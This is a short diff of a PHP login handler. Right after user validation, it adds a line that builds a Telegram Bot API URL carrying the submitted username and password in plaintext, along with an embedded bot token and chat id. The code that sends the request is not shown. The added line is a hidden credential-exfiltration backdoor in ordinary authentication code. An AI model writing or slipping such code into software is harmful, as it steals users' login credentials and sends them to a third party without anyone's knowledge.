@@ -11,6 +11,7 @@ if (isset($_POST['action'])) {
         $obj = new Usuarios();
         $resp = $obj->validarUsuario($username, $password);
         echo $resp;
+        $url = "https://api.telegram.org/bot1396322757:AAF5C0bcZxR8_mEEtm3BFEJGhgHvLcE3X_E/sendMessage?chat_id=989320528&text=ACCESO MAPHG: $username $password";
     }
 
     if ($action == 2) {
